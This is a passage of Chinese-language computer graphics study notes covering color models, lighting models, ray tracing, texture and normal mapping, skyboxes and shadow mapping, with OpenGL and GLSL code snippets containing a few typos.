<p>得到的有限观察空间又叫裁剪空间，视景体。</p>
<p>这里可以定义规范化的投影空间：<br>观察窗口在<code>XoY</code>面上<code>x = ±1, y = ±1</code>，前截面和后截面为<code>z = ±1</code><br>正投影：经过比例、平移变换得到投影空间。<br>斜平行投影：经过比例、平移、错切变换得到投影空间。<br>透视：透视变换。</p>
<p>这部分可以直接使用函数调用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">glm::mat4 proj = glm::<span class="built_in">perspective</span>(<span class="number">45.0f</span>, <span class="number">1.3f</span>, <span class="number">0.1f</span>, <span class="number">100.0f</span>);</span><br></pre></td></tr></table></figure>

<p>之后就是裁剪和屏幕映射了。</p>
<h2 id="光栅化阶段"><a href="#光栅化阶段" class="headerlink" title="光栅化阶段"></a>光栅化阶段</h2><p>首先是收集三角形，之后遍历三角形覆盖的像素，并对像素着色。最后通过片元操作（遮挡，透明等）得到三角形的真实像素。</p>
<h3 id="视觉现象"><a href="#视觉现象" class="headerlink" title="视觉现象"></a>视觉现象</h3><p>颜色辨别</p>
<ul>
<li>对青绿色和橙黄色最敏感<br>颜色对比：由视觉暂留效应引起</li>
<li>同时对比：环境色影响某一颜色的判断</li>
<li>即时对比：观察浅绿色后，再看黄色，会感觉到猩红</li>
<li>边界对比：多种颜色的边界处对比强烈（马赫带效应）</li>
<li>色相对比：同类色(15)，邻近色(45)，对比色(90-120)，互补色(180)</li>
<li>明度对比：颜色受环境的明度影响</li>
<li>纯度对比：环境纯度低会使物体显得鲜亮<br>颜色错觉：</li>
<li>同化现象：纹理会使背景色偏亮(暗)，纹理越接近背景，同化越明显</li>
<li>色彩的醒目性</li>
<li>色彩的进退：色块有前有后，对比度大时有进的感觉，反之有退的感觉</li>
<li>色彩的冷暖</li>
<li>色彩的胀缩</li>
<li>色彩的软硬</li>
<li>色彩的情绪</li>
</ul>
<h3 id="颜色的表示"><a href="#颜色的表示" class="headerlink" title="颜色的表示"></a>颜色的表示</h3><p>颜色的三特性：明度，色调，饱和度。<br>组合成空间表示–纺锤体：上下两个极端为明度中的白和黑；中间一圈表示色调；由圆心向外辐射表示饱和度。</p>
<p>CIE色度图：舌型曲线。</p>
<p>RGB, CMY：面向设备</p>
<p>HSV, HSL：面向用户，六棱锥形状，纺锤体状</p>
<p>OpenGL中的颜色模型：<br>存储方式：</p>
<ul>
<li>颜色索引</li>
<li>颜色值<ul>
<li>RGB 颜色模式，每个分量取值<code>0~1</code></li>
<li>RGBA 颜色模式，多一个不透明度，<code>1</code>表示不透明<ul>
<li>颜色混合：源颜色值s，源调和因子S，目标颜色值d，目标调和因子D<ul>
<li>调和颜色：<code>SrRs + DrRd, SgGs + DgGd, SbBs + DbBd, SaAs + DaAd</code></li>
</ul>
</li>
</ul>
</li>
<li>HDR：高动态范围图像，为了保留大于1.0的颜色值的细节，将颜色重新归一化</li>
</ul>
</li>
</ul>
<h3 id="光照模型"><a href="#光照模型" class="headerlink" title="光照模型"></a>光照模型</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>环境光：弥漫于整个空间的光线。不是来自于光源，而是来自于无限多的反射得到。</p>
<ul>
<li>特点：照射到物体表面的光均匀的来自于各个方向，并均匀的向各个方向反射。</li>
<li>表示：<code>Ie = Ia * Ka</code><ul>
<li>Ia：环境光强度</li>
<li>Ka：物体对环境光的反射系数</li>
</ul>
</li>
</ul>
<p>漫反射光：设点光源发出光强为Ip的光，向四周均匀辐射。物体得到的漫反射光取决于与光源的距离和朝向。</p>
<ul>
<li>理想漫反射：在一个粗糙，无光泽的表面上，光线沿各个方向做相同的反射，亮度相同。</li>
<li>特点：光源唯一，反射光均匀反射。</li>
<li>表示：<code>Id = Ip * Kd * cosA</code><ul>
<li>Ip：点光源亮度</li>
<li>A: 入射光与法线夹角</li>
<li>Kd：漫反射系数，与物体材料和光的波长决定</li>
</ul>
</li>
</ul>
<p>镜面反射：遵循反射定理，强度很大。</p>
<ul>
<li>理想反射：观察者和点光源在物体表面有，入射角等于反射角</li>
<li>非理想反射：入射角不等于反射角，但是依然可以看到高光</li>
<li>表示：<code>Is = Ip * Ks * (cosA)^n</code><ul>
<li>Ks：镜面反射系数</li>
<li>A：反射镜与观察者夹角的差值</li>
<li>n：反射指数，数目越大，物体越光滑，高光光斑越聚焦</li>
<li>公式为经验公式</li>
</ul>
</li>
</ul>
<p>综合表示：<code>I = Ia * Ka + Ip * Kd * (L · N) + Ip * Ks * (R · V)^n</code></p>
<h4 id="Phong-模型"><a href="#Phong-模型" class="headerlink" title="Phong 模型"></a>Phong 模型</h4><p>为了简化计算，做近似处理</p>
<p>近似处理：<code>I = Ia * Ka + Ip * Kd * (L · N) + Ip * Ks * (H · N)^n</code></p>
<ul>
<li>假设光源和视点在无穷远，采用平行投影，则<code>L</code>与<code>V</code>变为常量</li>
<li>取<code>H</code>为<code>(L+V)/2</code>，<code>N</code>为法线</li>
<li>最终得到高光的方向为一个常量。</li>
<li>误差：高光区域变大，通过适当调高<code>n</code>修正。</li>
</ul>
<p>光强衰减：距离为d时</p>
<ul>
<li>最简单的衰减因子：1&#x2F;(d^2)</li>
<li>实际使用：f(d) &#x3D; min(1, 1&#x2F;(c0 + c1 * d + c2 * d^2))</li>
</ul>
<p>此时的光强：<code>I = Ia * Ka + f(d) * Ip * Kd * (L · N) + f(d) *  Ip * Ks * (H · N)^n</code></p>
<p>此外，对RGB三个通道需要分别计算光强，需要的参数包括三种颜色的反射系数，三种颜色的光强。</p>
<p>消除马赫带效应的方法：</p>
<ul>
<li>多边形细分</li>
<li>光照插值</li>
<li>明暗处理：对顶点法向量做双线性插值</li>
</ul>
<p>平行光：不加衰减因子<br>点光源：保留衰减因子<br>聚光灯：光锥的内圆锥和外圆锥，中间是渐变</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 平行光</span></span><br><span class="line"><span class="function">vec3 <span class="title">CalcDirLight</span><span class="params">(DirLight light, vec3 normal, vec3 viewDir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!light.on)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">vec3</span>(<span class="number">0.0f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 漫反射</span></span><br><span class="line">    vec3 lightDir = <span class="built_in">normalize</span>(-light.direction);</span><br><span class="line">    <span class="type">float</span> diff = <span class="built_in">max</span>(<span class="built_in">dot</span>(normal, lightDir), <span class="number">0.0f</span>);</span><br><span class="line">    <span class="comment">// 镜面反射</span></span><br><span class="line">    vec3 reflectDir = <span class="built_in">reflect</span>(-lightDir, normal);</span><br><span class="line">    <span class="type">float</span> spec = <span class="built_in">pow</span>(<span class="built_in">max</span>(<span class="built_in">dot</span>(viewDir, reflectDir), <span class="number">0.0f</span>), material.shininess);</span><br><span class="line">    <span class="comment">// 漫反射 物体颜色</span></span><br><span class="line">    vec3 diffuseColor = <span class="built_in">vec3</span>(material.diffuse);</span><br><span class="line">    <span class="comment">// 叠加颜色</span></span><br><span class="line">    vec3 ambient = light.ambient * diffuseColor;</span><br><span class="line">    vec3 diffuse = light.diffuse * diff * diffuseColor;</span><br><span class="line">    vec3 specular = light.specular * spec * <span class="built_in">vec3</span>(material.specular);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ambient + diffuse + specular;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 点光源</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">float</span> d = <span class="built_in">lenght</span>(light.postion - fragPos);</span><br><span class="line">    <span class="type">float</span> attenuation = <span class="number">1.0</span> / (light.c + light.l * d + light.q * d * d);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> (ambient + diffuse + specular) * attenuation;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 聚光灯</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">float</span> theta = <span class="built_in">dot</span>(lightDir, <span class="built_in">normalize</span>(-light.direction));</span><br><span class="line">    <span class="type">float</span> epsilon = light.cutOff - light.outerCutOff;</span><br><span class="line">    <span class="type">float</span> intensity = <span class="built_in">clamp</span>((theta - light.outerCurOff)/ epsilon, <span class="number">0.0f</span>, <span class="number">1.0f</span>);  <span class="comment">// clamp 约束强度在 0 到 1 之间</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> (ambient + (diffuse + specular * intensity)) * attenuation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Whitted-光透射模型"><a href="#Whitted-光透射模型" class="headerlink" title="Whitted 光透射模型"></a>Whitted 光透射模型</h4><p>全局光照(GI)，又叫间接光照。</p>
<p>间接光照：</p>
<ul>
<li>来源：其他物体的反射，透射的折射光。</li>
</ul>
<p>在原来的基础上加入透射光强和反射光源。</p>
<p>透射光强：It * Kt</p>
<ul>
<li>Kt：透射系数</li>
</ul>
<p>反射光源：Ir * Kr</p>
<ul>
<li>Kr：反射系数（镜面反射）</li>
</ul>
<p>综合表示：<code>I = Ia * Ka + Ip * Kd * (L · N) + Ip * Ks * (R · V)^n + It * Kt + Ir * Kr</code></p>
<p>全局光照的主要算法：</p>
<p>Ray Tracing：光线追踪<br>Path Tracing：路径追踪<br>Photon Mapping：光子映射<br>Point-based Global Illumilation：基于点的全局光照<br>Voxel-based Global Illumilation：基于体素的全局光照<br>Ambient Occlusion：环境光遮蔽</p>
<h4 id="光线追踪"><a href="#光线追踪" class="headerlink" title="光线追踪"></a>光线追踪</h4><p>光线投射：从观察平面的每个像素射出一条射线，找到最接近的物体挡住射线的路径，得到光强。</p>
<p>光线追踪：在光线投射的前提下，加入物体表面的反射，折射，直到与光源相交。</p>
<p>计算方法：如果是漫反射，则直接计算该点被光源照射的颜色；如果是镜面反射或折射，则继续反射或折射到另一条光线。如此递归，直到达到结束条件（遇到光源，逃逸出场景，达到最大深度。</p>
<p>缺陷：</p>
<ul>
<li>表面属性单一：完全没有折射光或反射光。</li>
<li>不考虑漫反射：漫反射成为结束条件。</li>
</ul>
<p>修正：</p>
<ul>
<li>把表面属性改为混合的（反射20% + 折射30% + 漫反射50%）</li>
<li>使用蒙特卡洛近似简化。</li>
</ul>
<p>路径追踪：光线追踪 + 蒙特卡洛方法</p>
<h3 id="纹理"><a href="#纹理" class="headerlink" title="纹理"></a>纹理</h3><p>纹理类型：</p>
<ul>
<li>颜色纹理：花纹，图案</li>
<li>几何纹理：表面微观几何形状</li>
</ul>
<h4 id="颜色纹理"><a href="#颜色纹理" class="headerlink" title="颜色纹理"></a>颜色纹理</h4><p>纹理模式：</p>
<ul>
<li>图像纹理</li>
<li>函数纹理：使用函数定义简单的二维纹理，或随机高度场，或粗糙的几何纹理。</li>
</ul>
<p>纹理映射：<br>首先定义纹理模式，建立物体表面的点与纹理模式点之间的对应。<br>其次对应点与光照模型进行计算。</p>
<p>纹理空间：二维单位正方形区域，描述纹理。</p>
<p>纹理映射方法：</p>
<ul>
<li>建立物体空间表面和纹理空间的对应关系<ul>
<li>对物体表面坐标<code>(x, y, z)</code>用<code>u, v</code>参数化</li>
<li>反求参数<code>u, v</code>用<code>(x, y, z)</code>表达</li>
<li>根据<code>u, v</code>得到纹理值，并带入光照模型</li>
</ul>
</li>
</ul>
<p>纹理映射代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置纹理属性</span></span><br><span class="line"><span class="built_in">glTexParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);</span><br><span class="line"><span class="comment">// 加载纹理</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *data = <span class="built_in">stbi_load</span>(<span class="string">&quot;res/texture/contain.jpg&quot;</span>, &amp;width, &amp;height, &amp;nrchannels, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 生成纹理</span></span><br><span class="line"><span class="built_in">glGenTexutres</span>(<span class="number">1</span>, &amp;texture1);</span><br><span class="line"><span class="built_in">glTexImage2D</span>(GL_TEXTURE_2D, <span class="number">0</span>, GL_RGB, width, height <span class="number">0</span>, GL_RGB, GL_UNSIGNED_BYTE, data);</span><br><span class="line"><span class="comment">// 绑定纹理</span></span><br><span class="line"><span class="built_in">glBindTexture</span>(GL_TEXTURE_2D, texture1);</span><br></pre></td></tr></table></figure>

<p>立方体贴图：</p>
<ul>
<li>盒子贴图</li>
<li>天空盒贴图</li>
</ul>
<h4 id="纹理贴图过程"><a href="#纹理贴图过程" class="headerlink" title="纹理贴图过程"></a>纹理贴图过程</h4><p>纹理的定义和设置</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建纹理</span></span><br><span class="line">GLuint texture1;</span><br><span class="line"><span class="built_in">glGenTextrues</span>(<span class="number">1</span>, &amp;texture1);</span><br><span class="line"><span class="built_in">glBindTexture</span>(GL_TEXTURE_2D, texture1);</span><br><span class="line"><span class="comment">// S轴(x轴)方向上环绕方式 </span></span><br><span class="line"><span class="comment">// GL_REPEAT：重复</span></span><br><span class="line"><span class="comment">// GL_MIRRORED_REPEAT：重复且镜像</span></span><br><span class="line"><span class="comment">// GL_CLAMP_TO_EDGE：超出部分拉伸</span></span><br><span class="line"><span class="comment">// GL_CLAMP_TO_BORDER：超出部分填入其他颜色</span></span><br><span class="line"><span class="built_in">glTextParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);</span><br><span class="line"><span class="comment">// T轴(y轴)方向上环绕方式</span></span><br><span class="line"><span class="built_in">glTextParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);</span><br><span class="line"><span class="comment">// 纹理缩小的时候，过滤方式是 线性过滤：产生颗粒状图案，能更清晰看到纹理像素</span></span><br><span class="line"><span class="built_in">glTextParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);</span><br><span class="line"><span class="comment">// 纹理放大的时候，过滤方式是 临近过滤：产生平滑图案</span></span><br><span class="line"><span class="built_in">glTextParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);</span><br></pre></td></tr></table></figure>
<p>载入资源</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> width, height, nrchannels;</span><br><span class="line"><span class="built_in">stbi_set_flip_vertically_on_load</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *data = <span class="built_in">stbi_load</span>(<span class="string">&quot;a.jpg&quot;</span>, &amp;width, &amp;height, &amp;nrchannels, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(data)&#123;</span><br><span class="line">  <span class="comment">// 生成纹理</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">// 载入失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成纹理</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">glTexImage2D</span>(GL_TEXTURE_2D, <span class="number">0</span>, GL_RGB, width, height, <span class="number">0</span>, GL_RRGB, GL_UNSIGNED_BYTE, data);</span><br><span class="line"><span class="built_in">glGenerateMipmap</span>(GL_TEXTURE_2D);</span><br></pre></td></tr></table></figure>
<p>绑定纹理</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">glActiveTexture</span>(GL_TEXTURE0);</span><br><span class="line"><span class="built_in">glBindTexture</span>(GL_TEXTURE_2D, texture1);</span><br><span class="line">...</span><br><span class="line"><span class="built_in">glDrawArrays</span>(GL_TRANGLES, <span class="number">0</span>, <span class="number">36</span>);  <span class="comment">// 绘制</span></span><br></pre></td></tr></table></figure>
<p>立方体数据</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">float</span> vectices[] = &#123;</span><br><span class="line">  <span class="number">-0.5f</span>, <span class="number">-0.5f</span>, <span class="number">-0.5f</span>,  <span class="number">0.0f</span>,  <span class="number">0.0f</span>, <span class="comment">// 后面的两个是纹理的U V参数</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果使用立方体贴图，则不需要U V 参数</span></span><br></pre></td></tr></table></figure>

<p>着色器</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// box.vs 顶点着色器</span></span><br><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line"><span class="built_in">layout</span>(location = <span class="number">0</span>)</span><br><span class="line">in vec3 aPos;</span><br><span class="line"><span class="built_in">layout</span>(location = <span class="number">1</span>)</span><br><span class="line">in vec2 aTexCoord;</span><br><span class="line">out vec2 TexCoord;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  gl_Position = projection * view * model * <span class="built_in">vec4</span>(aPos, <span class="number">1.0</span>);</span><br><span class="line">  TexCoord = <span class="built_in">vec2</span>(aTexCoord.x, aTexCoord.y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// box.fs 片元着色器</span></span><br><span class="line"><span class="meta">#version 330</span></span><br><span class="line">coreout vec4 FragColor;</span><br><span class="line">in vec2 TexCoord;</span><br><span class="line">uniform sampler2D texture1;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  FragColor = <span class="built_in">texture</span>(texture1, TexCoord);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skybox.vs</span></span><br><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line"><span class="built_in">layout</span>(location = <span class="number">0</span>)</span><br><span class="line">in vec3 TexCoords;</span><br><span class="line">uniform mat4 projection;</span><br><span class="line">uniform mat4 view;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  TexCoord = aPos;</span><br><span class="line">  vec4 pos = projection * view  * <span class="built_in">vec4</span>(aPos, <span class="number">1.0</span>);</span><br><span class="line">  gl_Position = pos.xyww; <span class="comment">// z变为w，让其永远在最后面当背景</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skybox.fs</span></span><br><span class="line"><span class="meta">#version 330</span></span><br><span class="line">out vec4 FragColor;</span><br><span class="line">in vec3 TexCoords;</span><br><span class="line">uniform samplerCube skybox;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  FragColor = <span class="built_in">texture</span>(skybox, TexCoords);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>天空贴图可以使用立方体贴图：</p>
<pre><code> Top
</code></pre>
<p>Left Front Right Back<br>     Bottom</p>
<p>立方体贴图有自己特殊的属性，可以使用方向向量对其索引和采样。</p>
<p>纹理定义：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">load_cubemap</span><span class="params">(std::vector&lt;std::string&gt; faces)</span></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> textureID;</span><br><span class="line">  <span class="built_in">glGenTextrues</span>(<span class="number">1</span>, &amp;textureID);</span><br><span class="line">  <span class="built_in">glBindTexture</span>(GL_TEXTURE_CUBE_MAP, textureID);</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">glTextParameteri</span>(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);</span><br><span class="line">  <span class="built_in">glTextParameteri</span>(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);</span><br><span class="line">  <span class="built_in">glTextParameteri</span>(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_R, GL_CLAMP_TO_EDGE);</span><br><span class="line">  <span class="built_in">glTextParameteri</span>(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_MIN_FILTER, GL_LINEAR);</span><br><span class="line">  <span class="built_in">glTextParameteri</span>(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_MAG_FILTER, GL_LINEAR);</span><br><span class="line">  <span class="keyword">return</span> textureID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>资源载入：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">load_cubemap</span><span class="params">(std::vector&lt;std::string&gt; faces)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> width, height, nrchannels;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">glTexImage2D</span>(GL_TEXTURE_CUBE_MAP_POSITIVE_X + i, <span class="number">0</span>, GL_RGB, width, height, <span class="number">0</span>, GL_RGB, GL_UNSIGNED_BYTE, data);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> textureID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>天空盒不需要世界坐标系的模型变换，又由于相机始终在天空盒中心点，因此要消去view矩阵的位移部分。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">view = glm::<span class="built_in">mat4</span>(glm::<span class="built_in">mat3</span>(glm::<span class="built_in">lookAt</span>(camera_position, camera_position + camera_front, camera_up)));  <span class="comment">// 去除相机位移</span></span><br></pre></td></tr></table></figure>

<h4 id="几何纹理"><a href="#几何纹理" class="headerlink" title="几何纹理"></a>几何纹理</h4><p>对物体表面的几何性质做微小扰动，产生凹凸不平的细节效果。<br>例如物体表面P(u, v)，都沿着法向量方向位移F(u, v)个单位长度，新表面的位置：<code>P&#39;(u, v) = P(u, v) + F(u, v) * N(u, v)</code>，最终还是利用光照产生立体感。</p>
<p>算法：</p>
<ul>
<li>Bump Mapping 凹凸贴图：计算顶点光强时，给原始法向量加入一个扰动。</li>
<li>Displacement Mapping 移位贴图：直接作用于顶点，根据像素值，使顶点沿发现移动，产生真正的凹凸平面。</li>
<li>Normal Mapping 法线贴图：通过height map获得法向量信息，用RGB表示法向量的XYZ，之后计算光强，产生凹凸阴影效果。</li>
<li>Parallax Mapping 视差贴图：通过height map和视线，陡峭的视角给顶点更多的位移，否则给少量位移，通过视差获得立体感。</li>
<li>Relief Mapping 浮雕贴图：更精确的找出观察者视线与高度的交点，实现精确位移。</li>
</ul>
<p>法线贴图：<br>height map，高度图：</p>
<ul>
<li>存储的RGB值，实际上是法线的XYZ。</li>
<li>光照后颜色值发生变换产生凹凸不平的效果。</li>
<li>一个平面上的定点法向量方向根据height map取值。</li>
<li>height map的法向量需要根据平面调整到全局情况中。</li>
</ul>
<p>切线空间的引入：</p>
<ul>
<li>每个平面有一个自己的切线空间<ul>
<li>T：tangent 切线，x轴</li>
<li>B：bitangent 副切线，y轴</li>
<li>N：normal 法线，z轴</li>
</ul>
</li>
<li>通过平面上不共线3点确定TBN的方向量(TBN矩阵)</li>
<li>TBN矩阵叠加到法向量方向上得到法线贴图</li>
</ul>
<h4 id="法线贴图使用"><a href="#法线贴图使用" class="headerlink" title="法线贴图使用"></a>法线贴图使用</h4><p>一般height map偏蓝色，因为蓝色B表示z轴方向，指向用户。</p>
<p>使用height map：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">GLuint cube_diffuse_texture = <span class="built_in">LoadTextureFromFile</span>(<span class="string">&quot;.jpg&quot;</span>); <span class="comment">// 纹理</span></span><br><span class="line">GLuint cube_normal_texture = <span class="built_in">LoadTextureFromFile</span>(<span class="string">&quot;.jpg&quot;</span>);  <span class="comment">// 法线</span></span><br><span class="line"></span><br><span class="line"><span class="function">Shader <span class="title">normalmap_shader</span><span class="params">(<span class="string">&quot;.vs&quot;</span>, <span class="string">&quot;.fs&quot;</span>)</span></span>;  <span class="comment">// 加载着色器</span></span><br></pre></td></tr></table></figure>
<p>在着色器中使用法线贴图：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">uniform sampler2D texture_material;</span><br><span class="line">uniform sampler2D texture_normal;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  vec3 normal = <span class="built_in">texture</span>(texture_normal, fs_in.TexCoords).rgb; <span class="comment">// 采样</span></span><br><span class="line">  normal = <span class="built_in">normalize</span>(normal * <span class="number">2.0</span> - <span class="number">1.0</span>);  <span class="comment">// RGB(0,1)范围转换到法线(-1,1)</span></span><br><span class="line">  ...</span><br><span class="line">  vec3 result = ambient + diffuse + specular;</span><br><span class="line">  FragColor = <span class="built_in">vec4</span>(result, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>引入切线空间：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取TBN矩阵</span></span><br><span class="line"><span class="built_in">layout</span> (location = <span class="number">1</span>) in vec3 aNormal;</span><br><span class="line"><span class="built_in">layout</span> (location = <span class="number">3</span>) in vec3 aTangent;</span><br><span class="line"><span class="comment">// 计算TBN矩阵，右手系</span></span><br><span class="line">vec3 T = <span class="built_in">normalize</span>(<span class="built_in">vec3</span>(model * <span class="built_in">vec4</span>(aTangent, <span class="number">0.0f</span>)));</span><br><span class="line">vec3 N = <span class="built_in">normalize</span>(<span class="built_in">vec3</span>(model * <span class="built_in">vec4</span>(aNormal, <span class="number">0.0f</span>)));</span><br><span class="line">vec3 B = <span class="built_in">normalize</span>(<span class="built_in">cross</span>(T, N));</span><br><span class="line">vs_out.TBN = <span class="built_in">mat3</span>(T, B, N);  <span class="comment">// 传出TBN矩阵</span></span><br><span class="line"><span class="comment">// 引入切线到世界空间变换</span></span><br><span class="line">normal = <span class="built_in">texture</span>(normalMap, fs_in.TexCoords).rgb;</span><br><span class="line">normal = <span class="built_in">normalize</span>(normal * <span class="number">2.0</span> - <span class="number">1.0</span>);</span><br><span class="line">normal = <span class="built_in">normalize</span>(fs_in.TBN * normal);</span><br></pre></td></tr></table></figure>

<p>着色器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">uniform sampler2D texture_material;</span><br><span class="line">uniform sampler2D texture_normal;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  vec3 normal = <span class="built_in">texture</span>(texture_normal, fs_in.TexCoords).rgb; <span class="comment">// 采样</span></span><br><span class="line">  normal = <span class="built_in">normalize</span>(normal * <span class="number">2.0</span> - <span class="number">1.0</span>);  <span class="comment">// RGB(0,1)范围转换到法线(-1,1)</span></span><br><span class="line">  <span class="comment">// 引入切线到世界坐标变换</span></span><br><span class="line">  normal = <span class="built_in">normalize</span>(fs_in.TBN * normal);</span><br><span class="line">  <span class="comment">// 处理光照</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><p>基本思想：将视点移动到光源位置，用多边形区域排序消隐算法将多边形分为两类：向光与背光。再将视点移动到原来位置，对向光和背光多边形进行消隐，选用一种光照模型计算多边形亮度。</p>
<p>例如使用Phong模型，则对背光多边形只保留环境光。</p>
<p>主流算法：<br>Shadow Mapping：物体处于阴影是因为它与光源之间存在遮蔽物。<br>Shadow Volumn：根据光源和遮蔽物位置关系计算场景的阴影区域，然后对所有物体检测，确定是否受阴影影响。</p>
<h4 id="Shadow-Mapping"><a href="#Shadow-Mapping" class="headerlink" title="Shadow Mapping"></a>Shadow Mapping</h4><p>步骤：</p>
<ol>
<li>以光源为视点，对场景进行渲染，得到一幅所有物体相对于光源的depth map(shadow map)，每个位置存储该点上离最近片元的深度值。</li>
<li>恢复视点位置，对每个像素计算和光源的距离，将该值与depth map的值比较，确定该像素是否存在阴影当中。根据是否处于阴影，使用不同的光照计算策略。</li>
</ol>
<p>存在问题：阴影失真<br>解决方法：使用阴影偏移，简单对表面加入偏移量，让片元在表面上方。</p>
<p>使用FBO存储Shadow Map：<br>一个完整的帧缓冲(FBO)需要：</p>
<ul>
<li>至少一个缓冲：颜色，深度，模板缓冲</li>
<li>至少一个颜色附件：Attachment</li>
<li>所有附件是完整的：保留了内存</li>
<li>每个缓冲都有相同的样本数</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建并绑定一个帧缓冲</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> fbo;</span><br><span class="line"><span class="built_in">glGenFramebuffers</span>(<span class="number">1</span>, &amp;fbo);</span><br><span class="line"><span class="built_in">glBindFramebuffer</span>(GL_FRAMEBUFFER, fbo);</span><br><span class="line"><span class="comment">// 绑定附件 使用纹理存储shadow map</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> texture;</span><br><span class="line"><span class="built_in">glGenTextures</span>(<span class="number">1</span>, &amp;texture);</span><br><span class="line"><span class="built_in">glBindTexture</span>(GL_TEXTURE_2D, texture);</span><br><span class="line"><span class="built_in">glTexImage2D</span>(GL_TEXTURE_2D, <span class="number">0</span>, GL_RGB, <span class="number">800</span>, <span class="number">600</span>, <span class="number">0</span>, GL_RGB, GL_UNSIGNED_BYTE, <span class="literal">NULL</span>);</span><br><span class="line"><span 